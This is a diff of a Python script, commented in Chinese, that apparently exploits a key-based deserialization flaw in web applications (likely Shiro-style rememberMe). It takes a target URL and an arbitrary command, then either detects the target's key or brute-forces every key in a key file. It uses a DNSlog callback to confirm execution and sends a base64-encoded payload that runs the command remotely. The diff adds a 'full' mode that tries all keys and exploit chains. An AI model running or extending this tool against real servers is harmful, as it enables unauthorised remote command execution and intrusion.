@@ -4,27 +4,39 @@ import requests
 import time
 
 
-def scripts(url, command):
+def scripts(url, command, mode):
     """
     尊重原作者意愿，该判断逻辑未作修改，无授权勿测试。
     """
     processor = Idea()
     if "gov.cn" in url or "edu.cn" in url:
-        print("[-  存在敏感域名，停止检测，请使用其他工具或自行手工检测,抱歉")
+        print("[-] 存在敏感域名，停止检测，请使用其他工具或自行手工检测,抱歉")
         return
-    print("[*] 开始遍历目标使用Key值,请稍等...")
-    """
-    res_key = processor.find_target_key(url)
-    if res_key:
-    """
-    with open('data/keys.txt', 'r') as k:
-        ke = k.readlines()
-        for i in ke:
-            x = i.strip('\n')
-            y = x.split(':')
-            res_key = y[0]
-            print("[+] 使用key值: {}".format(res_key))
+
+    if mode == 'full':
+        print("[*] 开始执行全部Key值和利用链,请稍等...")
+        with open('data/keys.txt', 'r') as k:
+            ke = k.readlines()
+            for i in ke:
+                x = i.strip('\n')
+                y = x.split(':')
+                res_key = y[0]
+                print("[+] 使用key值: {}".format(res_key))
+                func = processor.get_dnslog_cookie()
+                print('[+] 执行命令: {} \n'.format(command))
+                time.sleep(1)
+                try:
+                    base_command = processor.get_base64_command(command)
+                    processor.process(url, base_command, res_key, func)
+                except Exception as err:
+                    print(err)
+    else:
+        print("[*] 开始检测目标使用的Key值,请稍等...")
+        res_key = processor.find_target_key(url)
+        if res_key:
+            print("[+] 目标使用key值: {}".format(res_key))
             func = processor.get_dnslog_cookie()
+            dnslog = func[0]
             print('[+] 执行命令: {} \n'.format(command))
             time.sleep(1)
             try:
@@ -32,10 +44,8 @@ def scripts(url, command):
                 processor.process(url, base_command, res_key, func)
             except Exception as err:
                 print(err)
-    """
-    else:
-        print("[-]很遗憾没有找到目标使用的key")
-    """
+        else:
+            print("[-] 很遗憾没有找到目标使用的key")
 
 
 class Idea(object):
